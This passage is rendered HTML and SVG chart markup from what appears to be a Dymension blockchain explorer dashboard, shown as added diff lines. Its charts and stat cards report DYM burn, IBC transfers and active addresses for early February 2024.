d="M50,15.138C51.193,16.801,52.386,18.464,53.579,25.114C54.772,31.764,55.965,47.753,57.158,57.493C58.351,67.232,59.544,77.121,60.737,83.552C61.93,89.982,63.123,92.852,64.316,96.077C65.509,99.302,66.702,98.893,67.895,102.901C69.088,106.908,70.281,115.922,71.474,120.124C72.667,124.326,73.86,126.133,75.053,128.115C76.246,130.096,77.439,130.998,78.632,132.013C79.825,133.028,81.018,133.261,82.211,134.203C83.404,135.146,84.596,137.375,85.789,137.67C86.982,137.965,88.175,137.948,89.368,138.112C90.561,138.276,91.754,138.512,92.947,138.655C94.14,138.798,95.333,138.851,96.526,138.97C97.719,139.089,98.912,139.368,100.105,139.368C101.298,139.368,102.491,139.368,103.684,139.368C104.877,139.368,106.07,139.368,107.263,139.368C108.456,139.368,109.649,139.368,110.842,139.368C112.035,139.368,113.228,139.368,114.421,139.368C115.614,139.368,116.807,139.368,118,139.368C119.193,139.368,120.386,139.368,121.579,139.368C122.772,139.368,123.965,139.368,125.158,139.368C126.351,139.368,127.544,139.368,128.737,139.368C129.93,139.368,131.123,139.368,132.316,139.368C133.509,139.368,134.702,139.368,135.895,139.368C137.088,139.368,138.281,139.368,139.474,139.368C140.667,139.368,141.86,139.368,143.053,139.368C144.246,139.368,145.439,139.368,146.632,139.368C147.825,139.368,149.018,139.368,150.211,139.368C151.404,139.368,152.596,139.368,153.789,139.368C154.982,139.368,156.175,139.368,157.368,139.368C158.561,139.368,159.754,139.368,160.947,139.368C162.14,139.368,163.333,139.368,164.526,139.368C165.719,139.368,166.912,139.368,168.105,139.368C169.298,139.368,170.491,139.368,171.684,139.368C172.877,139.368,174.07,139.368,175.263,139.368C176.456,139.368,177.649,139.368,178.842,139.368C180.035,139.368,181.228,139.368,182.421,139.368C183.614,139.368,184.807,139.368,186,139.368C187.193,139.368,188.386,139.368,189.579,139.368C190.772,139.368,191.965,139.368,193.158,139.368C194.351,139.368,195.544,139.368,196.737,139.368C197.93,139.368,199.123,139.368,200.316,139.368C201.509,139.368,202.702,163.014,203.895,163.024C205.088,163.034,206.281,163.029,207.474,163.039C208.667,163.05,209.86,163.25,211.053,163.259C212.246,163.268,213.439,163.268,214.632,163.272C215.825,163.277,217.018,163.282,218.211,163.287C219.404,163.291,220.596,163.296,221.789,163.3C222.982,163.304,224.175,163.306,225.368,163.309C226.561,163.313,227.754,163.316,228.947,163.319C230.14,163.322,231.333,163.326,232.526,163.33C233.719,163.333,234.912,163.333,236.105,163.34C237.298,163.347,238.491,163.509,239.684,163.516C240.877,163.524,242.07,163.52,243.263,163.528C244.456,163.536,245.649,163.637,246.842,163.643C248.035,163.649,249.228,163.647,250.421,163.652C251.614,163.657,252.807,163.667,254,163.672C255.193,163.677,256.386,163.676,257.579,163.683C258.772,163.691,259.965,164.049,261.158,164.086C262.351,164.122,263.544,164.128,264.737,164.14C265.93,164.152,267.123,164.153,268.316,164.158C269.509,164.162,270.702,164.161,271.895,164.168C273.088,164.174,274.281,164.258,275.474,164.263C276.667,164.268,277.86,164.268,279.053,164.271C280.246,164.273,281.439,164.273,282.632,164.279C283.825,164.284,285.018,164.605,286.211,164.609C287.404,164.613,288.596,164.613,289.789,164.615C290.982,164.617,292.175,164.619,293.368,164.621C294.561,164.623,295.754,164.625,296.947,164.627C298.14,164.629,299.333,164.629,300.526,164.634C301.719,164.639,302.912,164.711,304.105,164.716C305.298,164.721,306.491,164.721,307.684,164.723C308.877,164.725,310.07,164.725,311.263,164.729C312.456,164.734,313.649,164.805,314.842,164.809C316.035,164.813,317.228,164.813,318.421,164.814C319.614,164.816,320.807,164.818,322,164.82C323.193,164.822,324.386,164.823,325.579,164.826C326.772,164.829,327.965,164.835,329.158,164.838C330.351,164.841,331.544,164.84,332.737,164.844C333.93,164.847,335.123,164.865,336.316,164.868C337.509,164.872,338.702,164.872,339.895,164.874C341.088,164.875,342.281,164.877,343.474,164.879C344.667,164.881,345.86,164.882,347.053,164.884C348.246,164.886,349.439,164.886,350.632,164.89C351.825,164.894,353.018,164.931,354.211,164.934C355.404,164.937,356.596,164.937,357.789,164.939C358.982,164.94,360.175,164.94,361.368,164.943C362.561,164.947,363.754,165.449,364.947,165.504C366.14,165.559,367.333,165.583,368.526,165.586C369.719,165.589,370.912,165.59,372.105,165.591C373.298,165.592,374.491,165.594,375.684,165.595C376.877,165.596,378.07,165.598,379.263,165.599C380.456,165.601,381.649,165.603,382.842,165.604C384.035,165.606,385.228,165.607,386.421,165.608C387.614,165.61,388.807,165.611,390,165.613C391.193,165.615,392.386,165.616,393.579,165.618C394.772,165.619,395.965,165.62,397.158,165.621C398.351,165.623,399.544,165.623,400.737,165.625C401.93,165.628,403.123,165.816,404.316,165.893C405.509,165.97,406.702,166.084,407.895,166.086C409.088,166.088,410.281,166.088,411.474,166.089C412.667,166.091,413.86,166.092,415.053,166.093C416.246,166.094,417.439,166.095,418.632,166.096C419.825,166.097,421.018,166.098,422.211,166.099C423.404,166.1,424.596,166.101,425.789,166.102C426.982,166.103,428.175,166.105,429.368,166.106C430.561,166.107,431.754,166.108,432.947,166.109C434.14,166.11,435.333,166.111,436.526,166.112C437.719,166.113,438.912,166.113,440.105,166.113C441.298,166.114,442.491,166.115,443.684,166.116C444.877,166.116,446.07,166.117,447.263,166.118C448.456,166.118,449.649,166.12,450.842,166.12C452.035,166.121,453.228,166.121,454.421,166.121C455.614,166.122,456.807,166.122,458,166.123C459.193,166.125,460.386,166.145,461.579,166.146C462.772,166.147,463.965,166.147,465.158,166.148C466.351,166.148,467.544,166.149,468.737,166.149C469.93,166.15,471.123,166.151,472.316,166.151C473.509,166.152,474.702,166.153,475.895,166.153C477.088,166.154,478.281,166.154,479.474,166.155C480.667,166.155,481.86,166.156,483.053,166.157C484.246,166.157,485.439,166.158,486.632,166.158C487.825,166.159,489.018,166.159,490.211,166.16C491.404,166.16,492.596,166.161,493.789,166.161C494.982,166.162,496.175,166.163,497.368,166.164C498.561,166.164,499.754,166.165,500.947,166.165C502.14,166.166,503.333,166.168,504.526,166.168C505.719,166.169,506.912,166.169,508.105,166.17C509.298,166.17,510.491,166.171,511.684,166.171C512.877,166.172,514.07,166.173,515.263,166.173C516.456,166.174,517.649,166.175,518.842,166.176C520.035,166.176,521.228,166.176,522.421,166.177C523.614,166.177,524.807,166.178,526,166.178C527.193,166.179,528.386,166.178,529.579,166.179C530.772,166.179,531.965,166.181,533.158,166.182C534.351,166.182,535.544,166.183,536.737,166.183C537.93,166.184,539.123,166.184,540.316,166.185C541.509,166.185,542.702,166.186,543.895,166.187C545.088,166.187,546.281,166.187,547.474,166.188C548.667,166.188,549.86,166.189,551.053,166.19C552.246,166.191,553.439,166.193,554.632,166.194C555.825,166.195,557.018,166.196,558.211,166.196C559.404,166.197,560.596,166.198,561.789,166.198C562.982,166.199,564.175,166.2,565.368,166.2C566.561,166.201,567.754,166.201,568.947,166.202C570.14,166.202,571.333,166.203,572.526,166.203C573.719,166.204,574.912,166.205,576.105,166.206C577.298,166.206,578.491,166.207,579.684,166.208C580.877,166.208,582.07,166.209,583.263,166.21C584.456,166.211,585.649,166.211,586.842,166.212C588.035,166.212,589.228,166.213,590.421,166.214C591.614,166.214,592.807,166.215,594,166.216C595.193,166.217,596.386,166.217,597.579,166.218C598.772,166.218,599.965,166.219,601.158,166.219C602.351,166.22,603.544,166.221,604.737,166.221C605.93,166.222,607.123,166.223,608.316,166.223C609.509,166.224,610.702,166.224,611.895,166.225C613.088,166.226,614.281,166.226,615.474,166.227C616.667,166.227,617.86,166.227,619.053,166.228C620.246,166.23,621.439,166.505,622.632,166.506C623.825,166.507,625.018,166.507,626.211,166.508C627.404,166.508,628.596,166.508,629.789,166.509C630.982,166.509,632.175,166.509,633.368,166.51C634.561,166.51,635.754,166.511,636.947,166.512C638.14,166.512,639.333,166.513,640.526,166.513C641.719,166.513,642.912,166.514,644.105,166.515C645.298,166.515,646.491,166.516,647.684,166.516C648.877,166.517,650.07,166.518,651.263,166.518C652.456,166.519,653.649,166.519,654.842,166.519C656.035,166.52,657.228,166.52,658.421,166.52C659.614,166.521,660.807,166.522,662,166.522" fill="none" fill-opacity="0.6" height="170" stroke="#3182bd" width="612">
+               </path>
+              </g>
+             </g>
+            </svg>
+            <div class="recharts-tooltip-wrapper recharts-tooltip-wrapper-right recharts-tooltip-wrapper-bottom" role="dialog" style="pointer-events: none; visibility: hidden; position: absolute; top: 0px; left: 0px; transform: translate(60px, 10px);" tabindex="-1">
+             <div class="chart-tooltip">
+              <h6 class="tooltip-label">
+               Feb 06 2024 17:33
+              </h6>
+             </div>
+            </div>
+           </div>
+          </div>
+         </div>
+         <div class="chart-container section small area-chart-container network-chart-container positive">
+          <div class="property chart-property">
+           <p class="property-label property-label">
+            DYM Burn (7d)
+           </p>
+           <div class="property-value property-value">
+            0 DYM
+            <div class="statistics-change positive left-space">
+             <span class="icon-container caret-icon primary icon-color-original">
+              <svg fill="none" height="16" viewbox="0 0 17 16" width="17" xmlns="http://www.w3.org/2000/svg">
+               <path d="M3.3607 9.64625L8.3607 4.64625C8.40714 4.59976 8.46228 4.56288 8.52298 4.53772C8.58368 4.51256 8.64874 4.49961 8.71445 4.49961C8.78016 4.49961 8.84522 4.51256 8.90592 4.53772C8.96662 4.56288 9.02176 4.59976 9.0682 4.64625L14.0682 9.64625C14.1382 9.71618 14.1859 9.8053 14.2052 9.90235C14.2245 9.99939 14.2146 10.1 14.1768 10.1914C14.1389 10.2828 14.0747 10.3609 13.9924 10.4159C13.9101 10.4708 13.8134 10.5001 13.7144 10.5L3.71445 10.5C3.6155 10.5001 3.51875 10.4708 3.43646 10.4159C3.35416 10.3609 3.29001 10.2828 3.25214 10.1914C3.21426 10.1 3.20436 9.99939 3.22368 9.90235C3.24301 9.8053 3.29069 9.71618 3.3607 9.64625Z">
+               </path>
+              </svg>
+             </span>
+             0% (7d)
+            </div>
+           </div>
+          </div>
+          <span class="space">
+          </span>
+          <div class="period-selector">
+          </div>
+          <div class="recharts-responsive-container" height="232" style="width: 100%; height: 100%; min-width: 0px; min-height: 200px; max-height: 250px;" width="662">
+           <div class="recharts-wrapper" role="region" style="position: relative; cursor: default; width: 662px; height: 232px;">
+            <svg class="recharts-surface" height="232" viewbox="0 0 662 232" width="662">
+             <title>
+             </title>
+             <desc>
+             </desc>
+             <defs>
+              <clippath id="recharts6-clip">
+               <rect height="202" width="612" x="50" y="0">
+               </rect>
+              </clippath>
+             </defs>
+             <g class="recharts-cartesian-grid">
+              <g class="recharts-cartesian-grid-horizontal">
+               <line class="chart-grid" fill="none" height="202" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="50" x2="662" y="0" y1="0" y2="0">
+               </line>
+               <line class="chart-grid" fill="none" height="202" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="50" x2="662" y="0" y1="202" y2="202">
+               </line>
+              </g>
+              <g class="recharts-cartesian-grid-vertical">
+               <line class="chart-grid" fill="none" height="202" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="50" x2="50" y="0" y1="0" y2="202">
+               </line>
+               <line class="chart-grid" fill="none" height="202" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="662" x2="662" y="0" y1="0" y2="202">
+               </line>
+              </g>
+             </g>
+             <defs>
+              <lineargradient id="background0.5235204745896025" x1="0" x2="0" y1="0" y2="1">
+               <stop class="area-background" offset="5%" stop-opacity="0.7">
+               </stop>
+               <stop class="area-background" offset="95%" stop-opacity="0.1">
+               </stop>
+              </lineargradient>
+             </defs>
+            </svg>
+            <div class="recharts-tooltip-wrapper recharts-tooltip-wrapper-right recharts-tooltip-wrapper-bottom" role="dialog" style="pointer-events: none; visibility: hidden; position: absolute; top: 0px; left: 0px; transform: translate(50px, 10px);" tabindex="-1">
+             <div class="chart-tooltip">
+              <h6 class="tooltip-label">
+               Feb 07 2024 04:52
+              </h6>
+             </div>
+            </div>
+           </div>
+          </div>
+         </div>
+         <div class="chart-container section small area-chart-container ibc-transfers-chart-container network-chart-container positive">
+          <div class="property chart-property">
+           <p class="property-label property-label">
+            IBC Transfers (7d)
+           </p>
+           <div class="property-value property-value">
+            6,890
+            <div class="statistics-change positive left-space">
+             <span class="icon-container caret-icon primary icon-color-original">
+              <svg fill="none" height="16" viewbox="0 0 17 16" width="17" xmlns="http://www.w3.org/2000/svg">
+               <path d="M3.3607 9.64625L8.3607 4.64625C8.40714 4.59976 8.46228 4.56288 8.52298 4.53772C8.58368 4.51256 8.64874 4.49961 8.71445 4.49961C8.78016 4.49961 8.84522 4.51256 8.90592 4.53772C8.96662 4.56288 9.02176 4.59976 9.0682 4.64625L14.0682 9.64625C14.1382 9.71618 14.1859 9.8053 14.2052 9.90235C14.2245 9.99939 14.2146 10.1 14.1768 10.1914C14.1389 10.2828 14.0747 10.3609 13.9924 10.4159C13.9101 10.4708 13.8134 10.5001 13.7144 10.5L3.71445 10.5C3.6155 10.5001 3.51875 10.4708 3.43646 10.4159C3.35416 10.3609 3.29001 10.2828 3.25214 10.1914C3.21426 10.1 3.20436 9.99939 3.22368 9.90235C3.24301 9.8053 3.29069 9.71618 3.3607 9.64625Z">
+               </path>
+              </svg>
+             </span>
+             0% (7d)
+            </div>
+           </div>
+          </div>
+          <span class="space">
+          </span>
+          <div class="period-selector">
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            1D
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill active connectButton" tabindex="0" type="button">
+            1W
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            1M
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            1Y
+           </button>
+          </div>
+          <div class="recharts-responsive-container" height="200" style="width: 100%; height: 100%; min-width: 0px; min-height: 200px; max-height: 250px;" width="662">
+           <div class="recharts-wrapper" role="region" style="position: relative; cursor: default; width: 662px; height: 200px;">
+            <svg class="recharts-surface" height="200" viewbox="0 0 662 200" width="662">
+             <title>
+             </title>
+             <desc>
+             </desc>
+             <defs>
+              <clippath id="recharts9-clip">
+               <rect height="170" width="612" x="50" y="0">
+               </rect>
+              </clippath>
+             </defs>
+             <g class="recharts-cartesian-grid">
+              <g class="recharts-cartesian-grid-horizontal">
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="50" x2="662" y="0" y1="170" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="50" x2="662" y="0" y1="123.89080257126584" y2="123.89080257126584">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="50" x2="662" y="0" y1="77.78160514253166" y2="77.78160514253166">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="50" x2="662" y="0" y1="0" y2="0">
+               </line>
+              </g>
+              <g class="recharts-cartesian-grid-vertical">
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="50" x2="50" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="662" x2="662" y="0" y1="0" y2="170">
+               </line>
+              </g>
+             </g>
+             <g class="recharts-layer recharts-cartesian-axis recharts-xAxis xAxis">
+              <line class="recharts-cartesian-axis-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="50" x2="662" y="170" y1="170" y2="170">
+              </line>
+              <g class="recharts-cartesian-axis-ticks">
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="50" x2="50" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="50" y="186">
+                 <tspan dy="0.71em" x="50">
+                  Feb 06
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="662" x2="662" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="639.390625" y="186">
+                 <tspan dy="0.71em" x="639.390625">
+                  Feb 07
+                 </tspan>
+                </text>
+               </g>
+              </g>
+             </g>
+             <g class="recharts-layer recharts-cartesian-axis recharts-yAxis yAxis">
+              <line class="recharts-cartesian-axis-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="50" x2="50" y="0" y1="0" y2="170">
+              </line>
+              <g class="recharts-cartesian-axis-ticks">
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="44" x2="50" y="0" y1="170" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="170" orientation="left" stroke="none" text-anchor="end" width="50" x="42" y="170">
+                 <tspan dy="0.355em" x="42">
+                  0
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="44" x2="50" y="0" y1="123.89080257126584" y2="123.89080257126584">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="170" orientation="left" stroke="none" text-anchor="end" width="50" x="42" y="123.89080257126584">
+                 <tspan dy="0.355em" x="42">
+                  2K
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="44" x2="50" y="0" y1="77.78160514253166" y2="77.78160514253166">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="170" orientation="left" stroke="none" text-anchor="end" width="50" x="42" y="77.78160514253166">
+                 <tspan dy="0.355em" x="42">
+                  4K
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="44" x2="50" y="0" y1="0" y2="0">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="170" orientation="left" stroke="none" text-anchor="end" width="50" x="42" y="8.5">
+                 <tspan dy="0.355em" x="42">
+                  7.4K
+                 </tspan>
+                </text>
+               </g>
+              </g>
+             </g>
+             <defs>
+              <lineargradient id="background0.11794730667855036" x1="0" x2="0" y1="0" y2="1">
+               <stop class="area-background" offset="5%" stop-opacity="0.7">
+               </stop>
+               <stop class="area-background" offset="95%" stop-opacity="0.1">
+               </stop>
+              </lineargradient>
+             </defs>
+             <g class="recharts-layer recharts-area area-chart">
+              <g class="recharts-layer">
+               <path class="recharts-curve recharts-area-area" d="M50,166.058L662,15.096L662,170L50,170Z" fill="url(#background0.11794730667855036)" fill-opacity="0.6" height="170" stroke="none" width="612">
+               </path>
+               <path class="recharts-curve recharts-area-curve" d="M50,166.058L662,15.096" fill="none" fill-opacity="0.6" height="170" stroke="#3182bd" width="612">
+               </path>
+              </g>
+             </g>
+            </svg>
+            <div class="recharts-tooltip-wrapper recharts-tooltip-wrapper-right recharts-tooltip-wrapper-bottom" role="dialog" style="pointer-events: none; visibility: hidden; position: absolute; top: 0px; left: 0px; transform: translate(60px, 10px);" tabindex="-1">
+             <div class="chart-tooltip">
+              <h6 class="tooltip-label">
+               Feb 06 2024 23:18
+              </h6>
+             </div>
+            </div>
+           </div>
+          </div>
+         </div>
+         <div class="chart-container section small area-chart-container active-addresses-chart-container network-chart-container positive">
+          <div class="property chart-property">
+           <p class="property-label property-label">
+            Active Addresses
+           </p>
+           <div class="property-value property-value">
+            442,671
+            <div class="statistics-change positive left-space">
+             <span class="icon-container caret-icon primary icon-color-original">
+              <svg fill="none" height="16" viewbox="0 0 17 16" width="17" xmlns="http://www.w3.org/2000/svg">
+               <path d="M3.3607 9.64625L8.3607 4.64625C8.40714 4.59976 8.46228 4.56288 8.52298 4.53772C8.58368 4.51256 8.64874 4.49961 8.71445 4.49961C8.78016 4.49961 8.84522 4.51256 8.90592 4.53772C8.96662 4.56288 9.02176 4.59976 9.0682 4.64625L14.0682 9.64625C14.1382 9.71618 14.1859 9.8053 14.2052 9.90235C14.2245 9.99939 14.2146 10.1 14.1768 10.1914C14.1389 10.2828 14.0747 10.3609 13.9924 10.4159C13.9101 10.4708 13.8134 10.5001 13.7144 10.5L3.71445 10.5C3.6155 10.5001 3.51875 10.4708 3.43646 10.4159C3.35416 10.3609 3.29001 10.2828 3.25214 10.1914C3.21426 10.1 3.20436 9.99939 3.22368 9.90235C3.24301 9.8053 3.29069 9.71618 3.3607 9.64625Z">
+               </path>
+              </svg>
+             </span>
+             27.49% (7d)
+            </div>
+           </div>
+          </div>
+          <span class="space">
+          </span>
+          <div class="period-selector">
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            1D
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill active connectButton" tabindex="0" type="button">
+            1W
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            1M
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            1Y
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            ALL
+           </button>
+          </div>
+          <div class="recharts-responsive-container" height="200" style="width: 100%; height: 100%; min-width: 0px; min-height: 200px; max-height: 250px;" width="1366">
+           <div class="recharts-wrapper" role="region" style="position: relative; cursor: default; width: 1366px; height: 200px;">
+            <svg class="recharts-surface" height="200" viewbox="0 0 1366 200" width="1366">
+             <title>
+             </title>
+             <desc>
+             </desc>
+             <defs>
+              <clippath id="recharts12-clip">
+               <rect height="170" width="1316" x="50" y="0">
+               </rect>
+              </clippath>
+             </defs>
+             <g class="recharts-cartesian-grid">
+              <g class="recharts-cartesian-grid-horizontal">
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="1316" x="50" x1="50" x2="1366" y="0" y1="170" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="1316" x="50" x1="50" x2="1366" y="0" y1="125.46893827470952" y2="125.46893827470952">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="1316" x="50" x1="50" x2="1366" y="0" y1="80.93787654941903" y2="80.93787654941903">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="1316" x="50" x1="50" x2="1366" y="0" y1="0" y2="0">
+               </line>
+              </g>
+              <g class="recharts-cartesian-grid-vertical">
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="1316" x="50" x1="50" x2="50" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="1316" x="50" x1="708" x2="708" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="1316" x="50" x1="1366" x2="1366" y="0" y1="0" y2="170">
+               </line>
+              </g>
+             </g>
+             <g class="recharts-layer recharts-cartesian-axis recharts-xAxis xAxis">
+              <line class="recharts-cartesian-axis-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="1316" x="50" x1="50" x2="1366" y="170" y1="170" y2="170">
+              </line>
+              <g class="recharts-cartesian-axis-ticks">
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="1316" x="50" x1="50" x2="50" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="1316" x="50" y="186">
+                 <tspan dy="0.71em" x="50">
+                  Feb 06
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="1316" x="50" x1="708" x2="708" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="1316" x="708" y="186">
+                 <tspan dy="0.71em" x="708">
+                  Feb 07
+                 </tspan>
+                </text>
+               </g>
+              </g>
+             </g>
+             <g class="recharts-layer recharts-cartesian-axis recharts-yAxis yAxis">
+              <line class="recharts-cartesian-axis-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="50" x2="50" y="0" y1="0" y2="170">
+              </line>
+              <g class="recharts-cartesian-axis-ticks">
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="44" x2="50" y="0" y1="170" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="170" orientation="left" stroke="none" text-anchor="end" width="50" x="42" y="170">
+                 <tspan dy="0.355em" x="42">
+                  338K
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="44" x2="50" y="0" y1="125.46893827470952" y2="125.46893827470952">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="170" orientation="left" stroke="none" text-anchor="end" width="50" x="42" y="125.46893827470952">
+                 <tspan dy="0.355em" x="42">
+                  368K
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="44" x2="50" y="0" y1="80.93787654941903" y2="80.93787654941903">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="170" orientation="left" stroke="none" text-anchor="end" width="50" x="42" y="80.93787654941903">
+                 <tspan dy="0.355em" x="42">
+                  398K
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="44" x2="50" y="0" y1="0" y2="0">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="170" orientation="left" stroke="none" text-anchor="end" width="50" x="42" y="8.5">
+                 <tspan dy="0.355em" x="42">
+                  452K
+                 </tspan>
+                </text>
+               </g>
+              </g>
+             </g>
+             <defs>
+              <lineargradient id="background0.04210943866081851" x1="0" x2="0" y1="0" y2="1">
+               <stop class="area-background" offset="5%" stop-opacity="0.7">
+               </stop>
+               <stop class="area-background" offset="95%" stop-opacity="0.1">
+               </stop>
+              </lineargradient>
+             </defs>
+             <g class="recharts-layer recharts-area area-chart">
+              <g class="recharts-layer">
+               <path class="recharts-curve recharts-area-area" d="M50,155.833C93.867,155.833,137.733,155.833,181.6,155.833C225.467,155.833,269.333,96.922,313.2,88.151C357.067,79.379,400.933,79.492,444.8,74.993C488.667,70.495,532.533,64.894,576.4,61.16C620.267,57.426,664.133,55.269,708,52.59C751.867,49.91,795.733,47.341,839.6,45.082C883.467,42.822,927.333,41.334,971.2,39.033C1015.067,36.731,1058.933,34.03,1102.8,31.273C1146.667,28.515,1190.533,25.338,1234.4,22.487C1278.267,19.636,1322.133,16.901,1366,14.167L1366,170C1322.133,170,1278.267,170,1234.4,170C1190.533,170,1146.667,170,1102.8,170C1058.933,170,1015.067,170,971.2,170C927.333,170,883.467,170,839.6,170C795.733,170,751.867,170,708,170C664.133,170,620.267,170,576.4,170C532.533,170,488.667,170,444.8,170C400.933,170,357.067,170,313.2,170C269.333,170,225.467,170,181.6,170C137.733,170,93.867,170,50,170Z" fill="url(#background0.04210943866081851)" fill-opacity="0.6" height="170" stroke="none" width="1316">
+               </path>
